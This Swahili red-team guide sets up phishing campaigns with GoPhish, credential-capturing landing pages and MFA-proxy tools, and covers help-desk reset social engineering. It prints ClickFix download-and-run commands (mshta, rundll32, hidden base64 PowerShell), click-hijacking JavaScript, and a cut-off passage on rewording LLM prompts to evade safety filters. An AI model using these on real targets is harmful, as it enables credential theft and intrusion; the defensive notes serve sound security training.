# Methodology ya Phishing

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. Fanya Recon ya victim
1. Chagua **victim domain**.
2. Fanya web enumeration ya msingi **ukitafuta login portals** zinazotumiwa na victim na **amua** ni ipi utakayo **impersonate**.
3. Tumia **OSINT** **kutafuta emails**.
2. Andaa mazingira
1. **Nunua domain** utakayotumia kwa phishing assessment
2. **Sanidi records** zinazohusiana na **email service** (SPF, DMARC, DKIM, rDNS)
3. Sanidi VPS yenye **gophish**
3. Andaa campaign
1. Andaa **email template**
2. Andaa **web page** ya kuiba credentials
4. Zindua campaign!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: Domain name **ina keyword** muhimu ya original domain (mfano, zelster.com-management.com).<sup>[[1]](#references)</sup>
- **hypened subdomain**: Badilisha **dot iwe hyphen** ya subdomain (mfano, www-zelster.com).
- **New TLD**: Domain ileile ikitumia **TLD mpya** (mfano, zelster.org)
- **Homoglyph**: **Inabadilisha** herufi katika domain name na **herufi zinazofanana kwa mwonekano** (mfano, zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **Inabadilishana nafasi za herufi mbili** ndani ya domain name (mfano, zelsetr.com).
- **Singularization/Pluralization**: Inaongeza au kuondoa “s” mwishoni mwa domain name (mfano, zeltsers.com).
- **Omission**: **Inaondoa herufi moja** kwenye domain name (mfano, zelser.com).
- **Repetition:** **Inarudia herufi moja** katika domain name (mfano, zeltsser.com).
- **Replacement**: Kama homoglyph lakini si stealthy sana. Inabadilisha mojawapo ya herufi katika domain name, huenda kwa herufi iliyo karibu na herufi ya awali kwenye keyboard (mfano, zektser.com).
- **Subdomained**: Inaingiza **dot** ndani ya domain name (mfano, ze.lster.com).
- **Insertion**: **Inaingiza herufi** kwenye domain name (mfano, zerltser.com).
- **Missing dot**: Ambatisha TLD kwenye domain name. (mfano, zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Kuna **uwezekano kwamba baadhi ya bits zilizohifadhiwa au zilizo kwenye mawasiliano zinaweza kubadilishwa kiotomatiki** kutokana na sababu mbalimbali kama solar flares, cosmic rays, au hardware errors.

Dhana hii **inapotumika kwenye DNS requests**, inawezekana kwamba **domain iliyopokelewa na DNS server** si sawa na domain iliyoombwa awali.

Kwa mfano, marekebisho ya bit moja katika domain "windows.com" yanaweza kuibadilisha kuwa "windnws.com."

Attackers wanaweza **kunufaika na hili kwa kusajili domains nyingi za bit-flipping** zinazofanana na domain ya victim. Lengo lao ni kuwaelekeza users halali kwenye infrastructure yao wenyewe.

Kwa maelezo zaidi soma [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)<sup>[[9]](#references)</sup>

### Buy a trusted domain

Unaweza kutafuta kwenye [https://www.expireddomains.net/](https://www.expireddomains.net) domain iliyo-expire ambayo unaweza kuitumia.\
Ili kuhakikisha kwamba expired domain utakayonunua **tayari ina SEO nzuri**, unaweza kutafuta jinsi ilivyowekwa katika:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Ili **kugundua** email addresses halali zaidi au **kuthibitisha zile** ambazo tayari umegundua, unaweza kuangalia kama unaweza kuzifanyia brute-force kwenye smtp servers za victim. [Jifunze jinsi ya kuthibitisha/kugundua email address hapa](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Zaidi ya hayo, usisahau kwamba ikiwa users wanatumia **web portal yoyote kufikia emails zao**, unaweza kuangalia kama inaathiriwa na **username brute force**, na kutumia vulnerability hiyo ikiwezekana.

## Configuring GoPhish

### Installation

Unaweza kuipakua kutoka [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Pakua na decompress ndani ya `/opt/gophish` na execute `/opt/gophish/gophish`\
Utapewa password ya admin user kwenye port 3333 katika output. Kwa hiyo, fikia port hiyo na utumie credentials hizo kubadilisha admin password. Huenda ukahitaji kutunnel port hiyo kwenda local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Configuration

**Usanidi wa certificate ya TLS**

Kabla ya hatua hii, unapaswa kuwa **tayari umenunua domain** utakayotumia, na lazima iwe **imeelekezwa** kwenye **IP ya VPS** unayosanidi **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Usanidi wa barua pepe**

Anza kusakinisha: `apt-get install postfix`

Kisha ongeza domain kwenye mafaili yafuatayo:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Badilisha pia** thamani za variables zifuatazo ndani ya /etc/postfix/main.cf

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Hatimaye badilisha mafaili **`/etc/hostname`** na **`/etc/mailname`** yawe na jina la domain yako na **uwashe upya VPS yako.**

Sasa, tengeneza **DNS A record** ya `mail.<domain>` inayoelekeza kwenye **ip address** ya VPS na **DNS MX** record inayoelekeza kwenye `mail.<domain>`

Sasa hebu tujaribu kutuma barua pepe:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Usanidi wa Gophish**

Simamisha utekelezaji wa gophish na tuisanidi.\
Badilisha `/opt/gophish/config.json` kuwa yafuatayo (zingatia matumizi ya https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Sanidi huduma ya gophish**

Ili kuunda huduma ya gophish ili iweze kuanzishwa kiotomatiki na kudhibitiwa kama huduma, unaweza kuunda faili `/etc/init.d/gophish` yenye maudhui yafuatayo:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Kamilisha kusanidi huduma na kuiangalia kwa kufanya:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Kusanidi mail server na domain

### Subiri na uwe halali

Kadiri domain inavyokuwa ya zamani, ndivyo uwezekano wa kutambuliwa kama spam unavyopungua. Kwa hiyo, unapaswa kusubiri muda mwingi iwezekanavyo (angalau wiki 1) kabla ya kufanya phishing assessment. Zaidi ya hayo, ukiweka ukurasa kuhusu sekta yenye reputation nzuri, reputation utakayopata itakuwa bora zaidi.

Kumbuka kwamba hata ikiwa ni lazima usubiri wiki moja, unaweza kumaliza kusanidi kila kitu sasa.

### Kusanidi rekodi ya Reverse DNS (rDNS)

Weka rekodi ya rDNS (PTR) inayotatua anwani ya IP ya VPS kuwa jina la domain.

### Rekodi ya Sender Policy Framework (SPF)

Lazima **usanidi rekodi ya SPF kwa domain mpya**. Ikiwa hujui rekodi ya SPF ni nini [**soma ukurasa huu**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Unaweza kutumia [https://www.spfwizard.net/](https://www.spfwizard.net) kutengeneza sera yako ya SPF (tumia IP ya mashine ya VPS)

![Fomu ya SPF Wizard ya kutengeneza rekodi ya SPF kwa domain ya phishing](<../../images/image (1037).png>)

Hii ndiyo maudhui yanayopaswa kuwekwa ndani ya rekodi ya TXT ndani ya domain:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Rekodi ya Domain-based Message Authentication, Reporting & Conformance (DMARC)

Lazima **usanidi rekodi ya DMARC kwa domain mpya**. Ikiwa hujui rekodi ya DMARC ni nini [**soma ukurasa huu**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Unapaswa kuunda rekodi mpya ya DNS TXT inayoelekeza hostname `_dmarc.<domain>` yenye maudhui yafuatayo:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Ni lazima **usanidi DKIM kwa domain mpya**. Ikiwa hujui DMARC record ni nini [**soma ukurasa huu**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Tutorial hii inategemea: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)<sup>[[4]](#references)</sup>

> [!TIP]
> Unahitaji kuunganisha pamoja thamani zote mbili za B64 zinazozalishwa na DKIM key:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Jaribu alama ya usanidi wa barua pepe

Unaweza kufanya hivyo ukitumia [https://www.mail-tester.com/](https://www.mail-tester.com)\
Fungua ukurasa huo tu na utume barua pepe kwa anwani watakayokupa:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Unaweza pia **kuangalia usanidi wako wa barua pepe** kwa kutuma barua pepe kwa `check-auth@verifier.port25.com` na **kusoma jibu** (kwa hili utahitaji **kufungua** port **25** na kuona jibu katika faili _/var/mail/root_ ikiwa utatuma barua pepe kama root).\
Hakikisha kwamba unafaulu majaribio yote:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Unaweza pia kutuma **ujumbe kwa akaunti ya Gmail iliyo chini ya udhibiti wako**, kisha uangalie **vichwa vya barua pepe** kwenye kikasha chako cha Gmail; `dkim=pass` inapaswa kuwepo katika sehemu ya kichwa cha `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Kuondoa kwenye Spamhouse Blacklist

Ukurasa wa [www.mail-tester.com](https://www.mail-tester.com) unaweza kukuonyesha ikiwa domain yako inazuiwa na Spamhouse. Unaweza kuomba domain/IP yako iondolewe kupitia: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Kuondoa kwenye Microsoft Blacklist

​​Unaweza kuomba domain/IP yako iondolewe kupitia [https://sender.office.com/](https://sender.office.com).

## Unda na Zindua GoPhish Campaign

### Sending Profile

- Weka **jina la kutambua** sender profile
- Amua ni akaunti ipi utakayotumia kutuma phishing emails. Mapendekezo: _noreply, support, servicedesk, salesforce..._
- Unaweza kuacha username na password wazi, lakini hakikisha umechagua Ignore Certificate Errors

![Unda na Zindua GoPhish Campaign - Sending Profile: Unaweza kuacha username na password wazi, lakini hakikisha umechagua Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Inapendekezwa kutumia utendaji wa "**Send Test Email**" kujaribu ikiwa kila kitu kinafanya kazi.\
> Ninapendekeza **kutuma test emails kwenye anwani za 10min mails** ili kuepuka kuwekewa blacklist wakati wa kufanya majaribio.

### Email Template

- Weka **jina la kutambua** template
- Kisha andika **subject** (usiweke kitu cha ajabu, andika tu kitu ambacho ungetarajia kusoma kwenye email ya kawaida)
- Hakikisha umechagua "**Add Tracking Image**"
- Andika **email template** (unaweza kutumia variables kama katika mfano ufuatao):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Kumbuka kwamba **ili kuongeza uaminifu wa email**, inashauriwa kutumia signature kutoka kwenye email ya client. Mapendekezo:

- Tuma email kwa **anwani isiyokuwepo** na uangalie kama jibu lina signature yoyote.
- Tafuta **public emails** kama info@ex.com au press@ex.com au public@ex.com, zitumie email na usubiri jibu.
- Jaribu kuwasiliana na **email halali iliyogunduliwa** na usubiri jibu.

![Sending Profile - Email Template: Jaribu kuwasiliana na email halali iliyogunduliwa na usubiri jibu](<../../images/image (80).png>)

> [!TIP]
> Email Template pia inaruhusu **kuambatisha files za kutuma**. Ikiwa pia ungependa kuiba NTLM challenges kwa kutumia files/documents zilizotengenezwa maalum [soma ukurasa huu](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Weka **jina**
- **Andika HTML code** ya web page. Kumbuka kwamba unaweza **ku-import** web pages.
- Weka alama kwenye **Capture Submitted Data** na **Capture Passwords**
- Weka **redirection**

![Email Template - Landing Page: Weka alama kwenye Capture Submitted Data na Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Kwa kawaida utahitaji kurekebisha HTML code ya page na kufanya majaribio locally (labda ukitumia Apache server) **hadi uridhike na matokeo.** Kisha, andika HTML code hiyo kwenye kisanduku.\
> Kumbuka kwamba ikiwa unahitaji **kutumia static resources** kwa ajili ya HTML (labda baadhi ya CSS na JS pages) unaweza kuzihifadhi kwenye _**/opt/gophish/static/endpoint**_ na kisha kuzifikia kupitia _**/static/\<filename>**_

> [!TIP]
> Kwa redirection unaweza **kuwa-redirect users kwenda legit main web page** ya victim, au kuwa-redirect kwenda _/static/migration.html_ kwa mfano, weka **spinning wheel (**[**https://loading.io/**](https://loading.io)**) kwa sekunde 5 kisha uonyeshe kwamba process ilifanikiwa**.

### Users & Groups

- Weka jina
- **Import data** (kumbuka kwamba ili kutumia template kwa mfano huu unahitaji firstname, last name na email address ya kila user)

![Landing Page - Users & Groups: Import data (kumbuka kwamba ili kutumia template kwa mfano huu unahitaji firstname, last name na email address ya kila user)](<../../images/image (163).png>)

### Campaign

Hatimaye, tengeneza campaign kwa kuchagua jina, email template, landing page, URL, sending profile na group. Kumbuka kwamba URL itakuwa link itakayotumwa kwa victims.

Kumbuka kwamba **Sending Profile inaruhusu kutuma test email ili kuona jinsi phishing email ya mwisho itakavyoonekana**:

![Users & Groups - Campaign: Kumbuka kwamba Sending Profile inaruhusu kutuma test email ili kuona jinsi phishing email ya mwisho itakavyoonekana](<../../images/image (192).png>)

> [!TIP]
> Ninapendekeza **kutuma test emails kwenye anwani za 10min mails** ili kuepuka ku-blacklistiwa wakati wa kufanya majaribio.

Mara kila kitu kitakapokuwa tayari, launch campaign!

## Website Cloning

Ikiwa kwa sababu yoyote unataka ku-clone website, angalia ukurasa ufuatao:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Katika baadhi ya phishing assessments (hasa kwa Red Teams) utataka pia **kutuma files zenye aina fulani ya backdoor** (labda C2 au kitu kitakachotrigger authentication).\
Angalia ukurasa ufuatao kwa baadhi ya mifano:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Attack ya awali ni ya werevu kwa sababu una-fake website halisi na kukusanya taarifa zilizowekwa na user. Kwa bahati mbaya, ikiwa user hakuweka password sahihi au ikiwa application uliyo-fake ime-configurewa na 2FA, **taarifa hii haitakuruhusu ku-impersonate user aliyedanganywa**.

Hapa ndipo tools kama [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) na [**muraena**](https://github.com/muraenateam/muraena) zinapokuwa useful. Tool hii itakuruhusu ku-generate attack kama ya MitM. Kimsingi, attack hufanya kazi kwa njia ifuatayo:

1. Una **impersonate login** form ya webpage halisi.
2. User **anatuma** **credentials** zake kwenye fake page yako, na tool inazituma kwenye webpage halisi, **ikiangalia kama credentials zinafanya kazi**.
3. Ikiwa account ime-configurewa na **2FA**, MitM page itaomba 2FA na mara **user anapoiingiza**, tool itaituma kwenye web page halisi.
4. Mara user anapokuwa authenticated, wewe (kama attacker) utakuwa **umecapture credentials, 2FA, cookie na taarifa yoyote** kutoka kwenye kila interaction iliyofanywa wakati tool inafanya MitM.

### Via VNC

Je, ikiwa badala ya **kumtuma victim kwenye malicious page** yenye mwonekano sawa na ya awali, ungemtuma kwenye **VNC session yenye browser iliyounganishwa kwenye web page halisi**? Utaweza kuona anachofanya, kuiba password, MFA inayotumika, cookies...\
Unaweza kufanya hivi kwa [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)<sup>[[3]](#references)</sup>

## Detecting the detection

Ni wazi kwamba mojawapo ya njia bora za kujua kama umebusted ni **kutafuta domain yako kwenye blacklists**. Ikiwa inaonekana ikiwa listed, kwa namna fulani domain yako imegunduliwa kama yenye mashaka.\
Njia moja rahisi ya kuangalia kama domain yako inaonekana kwenye blacklist yoyote ni kutumia [https://malwareworld.com/](https://malwareworld.com)

Hata hivyo, kuna njia nyingine za kujua kama victim **anatafuta kwa bidii suspicious phishing activity in the wild**, kama ilivyoelezwa kwenye:


{{#ref}}
detecting-phising.md
{{#endref}}

Unaweza **kununua domain yenye jina linalofanana sana** na domain ya victim **na/au ku-generate certificate** kwa ajili ya **subdomain** ya domain unayo-control, **ikiwa na** **keyword** ya domain ya victim. Ikiwa **victim** atafanya aina yoyote ya **DNS au HTTP interaction** nayo, utajua kwamba **anatafuta kwa bidii** suspicious domains na utahitaji kuwa stealth sana.<sup>[[2]](#references)</sup>

### Evaluate the phishing

Tumia [**Phishious** ](https://github.com/Rices/Phishious)kutathmini kama email yako itaishia kwenye spam folder au itablockiwa au itafanikiwa.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Modern intrusion sets zinazidi kuruka email lures kabisa na **kulenga moja kwa moja service-desk / identity-recovery workflow** ili kushinda MFA. Attack ni "living-off-the-land" kikamilifu: operator anapokuwa na valid credentials, anapivot kwa kutumia built-in admin tooling – hakuna malware inayohitajika.<sup>[[5]](#references)</sup>

### Attack flow
1. Fanya recon ya victim
* Kusanya personal & corporate details kutoka LinkedIn, data breaches, public GitHub, n.k.
* Tambua identities zenye thamani kubwa (executives, IT, finance) na bainisha **help-desk process kamili** ya password / MFA reset.
2. Real-time social engineering
* Piga simu, tumia Teams au chat na help-desk huku ukijifanya kuwa target (mara nyingi kwa **spoofed caller-ID** au **cloned voice**).
* Toa PII iliyokusanywa awali ili kupita knowledge-based verification.
* Mshawishi agent **a-reset MFA secret** au afanye **SIM-swap** kwenye mobile number iliyosajiliwa.
3. Immediate post-access actions (≤60 min in real cases)
* Establish foothold kupitia web SSO portal yoyote.
* Enumerate AD / AzureAD kwa built-ins (hakuna binaries zinazodondoshwa):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Fanya lateral movement kwa **WMI**, **PsExec**, au legitimate **RMM** agents ambazo tayari zimewhitelistiwa kwenye environment.

### Detection & Mitigation
* Chukulia help-desk identity recovery kama **privileged operation** – hitaji step-up auth & manager approval.
* Deploy **Identity Threat Detection & Response (ITDR)** / **UEBA** rules zinazotoa alert kwenye:
* MFA method imebadilishwa + authentication kutoka device / geo mpya.
* Immediate elevation ya principal huyo huyo (user-→-admin).
* Rekodi help-desk calls na enforce **call-back kwenye namba iliyosajiliwa tayari** kabla ya reset yoyote.
* Implement **Just-In-Time (JIT) / Privileged Access** ili accounts zilizoresetiwa upya **zisirithi high-privilege tokens** automatically.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews hupunguza gharama ya high-touch ops kwa mass attacks zinazogeuza **search engines & ad networks kuwa delivery channel**.<sup>[[5]](#references)</sup>

1. **SEO poisoning / malvertising** husukuma fake result kama `chromium-update[.]site` hadi juu ya search ads.
2. Victim anapakua **first-stage loader** ndogo (mara nyingi JS/HTA/ISO). Mifano iliyoonekana na Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader hu-exfiltrate browser cookies + credential DBs, kisha hupakua **silent loader** inayoamua – *in realtime* – kama itadeploy:
* RAT (kwa mfano AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Block newly-registered domains & enforce **Advanced DNS / URL Filtering** kwenye *search-ads* pamoja na e-mail.
* Restrict software installation kwa signed MSI / Store packages, deny `HTA`, `ISO`, `VBS` execution kwa policy.
* Monitor child processes za browsers zinazofungua installers:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Hunt kwa LOLBins zinazotumiwa vibaya mara kwa mara na first-stage loaders (kwa mfano `regsvr32`, `curl`, `mshta`).

### Download-button click hijacking with TDS handoff
Baadhi ya fake software portals huacha inayoonekana download `href` ikielekeza kwenye **real GitHub/release URL**, lakini hu-hijack interaction **ya kwanza** ya user katika JavaScript na badala yake humpeleka victim kwenye chain ya **Traffic Distribution System (TDS)**.<sup>[[8]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Sifa kuu:
- Hook kwa kawaida huendeshwa katika **capture phase** (`true`) kwenye `document`, hivyo huendeshwa kabla ya handlers za tovuti.
- Chrome mara nyingi hutumia `mousedown` badala ya `click` ili kuweka redirect ikiwa imefungamana na **user gesture** halali na kuboresha uwezekano wa kupita **popup-blocker**.
- Baadhi ya variants hufungua mapema `about:blank` au hutengeneza clicks za `<a target="_blank">`, kisha huweka TDS URL baadaye.
- Vikomo vya upande wa browser mara nyingi huhifadhiwa kwenye `localStorage`, hivyo **click ya kwanza** inaweza kumfikisha mtumiaji kwenye malware, ilhali refresh/retry hurudi kwenye link inayoonekana kuwa benign.
- TDS inaweza kuchuja kwa kutumia referrer, entry domain, GEO, browser/device fingerprint, ukaguzi wa VPN/datacenter, click context na counters za kila session, hivyo replay za analyst zinaweza kutoa matokeo yasiyo thabiti.

Mawazo ya Defender:
- Linganisha `href` **inayoonyeshwa** na navigation target **halisi** inayozalishwa wakati wa click.
- Tafuta handlers za `document.addEventListener(..., true)` zinazotumia kwa pamoja `preventDefault()` na `stopImmediatePropagation()` karibu na `window.open`, `about:blank` au clicks za synthetic anchor.
- Chukulia makundi ya domains mpya za software-download ambazo zote hupakia stage ileile ya CloudFront/JS kuwa pattern yenye signal kubwa ya SEO-poisoning/TDS.

### ClickFix kutoka fake verification pages + archive-looking LOLBAS fetches
Baadhi ya matawi ya TDS huishia kwenye fake verification page (ya mtindo wa Cloudflare/IUAM) inayomwambia victim aendeshe Windows binary inayoaminika kama:<sup>[[8]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Notes:
- `mshta.exe` hutekeleza **HTA/VBScript mwanzoni mwa jibu**, hata kama URL inajifanya kuwa archive ya `.7z`; data ya archive iliyoongezwa inaweza kuwa decoy tupu.
- Hatua zinazofuata mara nyingi zinaendelea kudanganya kuhusu aina ya faili (`.rtf` kwa PowerShell, `.asar` kwa Python, ZIP zilizo na binaries zilizopachikwa padding), kisha hubadilisha hadi **manual PE mapping / in-memory execution**.
- Ikiwa unachunguza mojawapo ya chain hizi, hifadhi **network + memory tangu utekelezaji wa kwanza uliofanikiwa**: replay za baadaye zinaweza kuonyesha tu njia salama ya installer/SFX au kushindwa kwa sababu payload/key release ilifungwa kwenye TDS session ya awali.

### ClickFix DLL delivery tradecraft (fake CERT update)
* Chambo: ushauri wa CERT ya taifa ulioklonwa wenye kitufe cha **Update** kinachoonyesha maelekezo ya “fix” hatua kwa hatua. Waathiriwa wanaambiwa waendeshe batch inayopakua DLL na kuiendesha kupitia `rundll32`.<sup>[[8]](#references)</sup>
* Typical batch chain observed:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` huweka payload kwenye `%TEMP%`, kusubiri kwa muda mfupi huficha network jitter, kisha `rundll32` huita entrypoint iliyotolewa (`notepad`).
* DLL hutuma taarifa za utambulisho wa host na kuwasiliana na C2 kila baada ya dakika chache. Remote tasking huwasili ikiwa **base64-encoded PowerShell**, inayotekelezwa ikiwa imefichwa na ikiwa na policy bypass:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Hii hudumisha unyumbufu wa C2 (server inaweza kubadilisha tasks bila kusasisha DLL) na huficha madirisha ya console. Tafuta children wa PowerShell wa `rundll32.exe` wanaotumia `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` kwa pamoja.
* Defenders wanaweza kutafuta HTTP(S) callbacks za muundo `...page.php?tynor=<COMPUTER>sss<USER>` na polling ya vipindi vya dakika 5 baada ya DLL kupakiwa.

---

## Operesheni za Phishing zilizoimarishwa na AI
Attackers sasa huunganisha **LLM & voice-clone APIs** kwa chambo zilizobinafsishwa kikamilifu na mwingiliano wa wakati halisi.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generate & send >100 k emails / SMS with randomised wording & tracking links.|
|Generative AI|Produce *one-off* emails referencing public M&A, inside jokes from social media; deep-fake CEO voice in callback scam.|
|Agentic AI|Autonomously register domains, scrape open-source intel, craft next-stage mails when a victim clicks but doesn’t submit creds.|

**Defence:**
• Ongeza **dynamic banners** zinazoangazia messages zilizotumwa kutoka kwenye automation isiyoaminika (kupitia anomalies za ARC/DKIM).
• Tumia **voice-biometric challenge phrases** kwa maombi ya simu yenye hatari kubwa.
• Endelea kuiga chambo zinazozalishwa na AI katika awareness programmes – static templates zimepitwa na wakati.

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Attackers wanaweza kusambaza HTML inayoonekana kuwa salama na **generate stealer wakati wa runtime** kwa kuomba **trusted LLM API** iwape JavaScript, kisha kuiendesha ndani ya browser (kwa mfano, `eval` au dynamic `<script>`).<sup>[[7]](#references)</sup>

1. **Prompt-as-obfuscation:** encode exfil URLs/Base64 strings kwenye prompt; badilisha wording mara kwa mara ili kupita safety filters na kupunguza hallucinations.
